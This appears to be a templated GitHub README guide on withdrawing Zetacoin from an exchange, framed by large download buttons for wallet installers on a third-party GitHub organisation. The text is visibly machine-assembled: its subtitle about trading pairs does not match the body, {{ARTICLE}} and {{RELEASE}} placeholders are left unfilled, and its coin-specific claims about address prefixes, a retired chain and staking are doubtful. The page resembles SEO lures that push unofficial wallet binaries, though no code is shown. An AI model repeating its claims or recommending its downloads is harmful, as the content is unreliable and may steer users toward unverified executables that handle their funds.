![Zetacoin Wallet](assets/banner-article.png)

<h1 align="center">Move Zetacoin Out of an Exchange</h1>

<p align="center">The pairs that exist, and how a thin market actually behaves.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds, their checksums and older tags are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

To move ZET off an exchange, generate a receiving address in your own wallet, confirm it begins with `9`, start the withdrawal on the exchange, and verify the balance in the wallet after the venue's confirmation threshold. Send a small test first if the venue is new to you, and never send ZET to a `Z...` address.

## Why withdrawing matters

Coins on an exchange are a claim on the exchange, not coins you hold. If the venue freezes withdrawals, is hacked or closes, the balance is at risk regardless of what the chain says.

For a small-cap coin on a small venue, that risk is not theoretical. Withdrawal freezes are the common failure mode, and they usually arrive without warning.

Self-custody moves the risk to you, where it is at least manageable: a wallet, a backup and a passphrase are things you control.

The full walk-through, with the checks in order, is in [Where to Buy Zetacoin](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/where-to-buy-coins-safely.md).

## Before you start

Have the wallet installed and synced, because an address from an unsynced wallet is still valid but a balance you cannot see is alarming. Confirm the wallet's address begins with `9`.

Check the exchange's withdrawal fee and minimum. A withdrawal fee that exceeds the amount you are moving is a reason to wait until the balance is larger.

Check whether the venue requires any additional verification for withdrawals. Many do, and discovering that after initiating a withdrawal adds delay.

## The withdrawal, step by step

1. Open the wallet's receive tab and copy a fresh address.
2. Confirm the first character is a nine.
3. On the exchange, open the withdrawal page for ZET and paste the address.
4. Enter the amount, review the fee, and confirm.
5. Wait for the venue to process it, then for the chain to confirm.
6. Check the balance in your wallet.

Fresh address per withdrawal is good practice and costs nothing. It also makes it obvious in the history which withdrawal is which.

For the background behind this step, [Zetacoin Exchange List and Trading Pairs](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/exchange-list-and-trading-pairs.md) covers the same ground in more detail.

## The test withdrawal

For a venue you have not used before, withdraw a small amount first. It proves the address format, the venue's withdrawal path, and your ability to see the balance arrive.

The test costs one withdrawal fee and a few minutes. The alternative is discovering a problem with a large balance already in transit.

## When the withdrawal does not arrive

Check three things in order. First, whether the exchange shows the withdrawal as completed or pending, because a pending withdrawal has not been broadcast. Second, whether a public explorer shows the transaction, which distinguishes a broadcast transaction from one that never left the venue. Third, whether your wallet is synced enough to see it.

If the explorer shows it and the wallet does not, the wallet is behind. If neither shows it, the venue has not sent it, and the exchange's support is the only route.

## Address mistakes and what they cost

A withdrawal to a `Z...` address is a transfer to the retired chain, where coins are no longer exchangeable. There is no recovery, because the receiving chain's coins cannot be converted.

A withdrawal to an address from another project  -  a different coin entirely  -  is also unrecoverable, and the name confusion with ZetaChain makes this more likely than it should be.

Both mistakes are prevented by one check: the address must have been generated by a Zetacoin wallet and begin with a nine.

## Keeping the balance safe afterwards

Back up `wallet.dat` once the coins arrive, and encrypt the wallet if it is not encrypted. A withdrawal to an unencrypted wallet with no backup has moved the risk rather than removed it.

Then decide whether to stake. A balance that sits in a synced wallet can earn PoS blocks, which is one advantage of self-custody that an exchange balance does not provide.

## Common questions

### How long does a withdrawal take?

The venue's processing time plus the chain's confirmation time. The chain is quick; the venue is the variable.

### Can I withdraw directly to a staking wallet?

Yes, if the wallet is synced, unlocked for staking only and the coins mature afterwards.

### What if I sent to the wrong address?

There is no recall. If the address belonged to another person, only they can return the funds; if it belonged to another chain, the coins are not recoverable.

### Do I need to withdraw everything at once?

No, and for a new venue a test withdrawal first is the safer sequence.

## The short version

Fresh `9...` address, test amount, confirm on the explorer, verify in the wallet, then back up and encrypt.

Related pages: {{ARTICLE:where-to-buy-zetacoin}} for the buying side, {{ARTICLE:zetacoin-exchange-list}} for venues, {{ARTICLE:zetacoin-address-format-prefix}} for the prefix rule, and {{ARTICLE:how-to-backup-zetacoin-wallet}} for what to do the moment the coins land. The client is on {{RELEASE}}.

## What the exchange controls until you withdraw

Until the withdrawal completes, the venue controls the coins. It can delay processing, require additional checks, or in the worst case stop withdrawals entirely while still showing a balance.

That is not a hypothetical failure mode for small venues; it is the standard one. Withdrawal freezes arrive without notice, and a balance that cannot leave is worth nothing regardless of the price shown.

Withdrawing promptly after a purchase is therefore not paranoia. It converts a claim into an asset you control, and it removes the venue from your risk surface entirely.

## What to keep on a venue

A small working balance for trading is reasonable if you trade often. Anything you intend to hold should be in a wallet, with a backup of the file and a passphrase stored separately.

The line to draw is between coins in transit and coins in storage. Transit belongs on the venue; storage belongs with you.

{{ARTICLE:zetacoin-exchange-list}} covers how to judge a venue, and {{ARTICLE:zetacoin-wallet-hack-risk}} covers what self-custody requires in return.

## What to record when you withdraw

Note the amount, the address and the date, and keep the transaction reference if the venue provides one. That record turns a later question about a missing balance into a lookup rather than a reconstruction.

If a withdrawal is delayed, the record is what support asks for, and an explorer link settles in seconds what a description cannot. Keep the same record for the deposit side, so the route is traceable in both directions.

For the wallet side of the same habit, {{ARTICLE:zetacoin-wallet-desktop-client-guide}} describes where the history lives in the client, and {{ARTICLE:how-to-backup-zetacoin-wallet}} covers the copy that makes the balance recoverable at all.

---

## Download Zetacoin Wallet

The three installers for v0.13.2.2 are listed at the top of this page: `zetacoin-0.13.2.2-win-setup.exe`, `zetacoin-0.13.2.2-osx.dmg` and `zetacoin-0.13.2.2-linux.zip`.

## Related guides

- [Send and Receive Zetacoin](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/send-and-receive-coins.md)
- [Zetacoin Exchange List and Trading Pairs](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/exchange-list-and-trading-pairs.md)
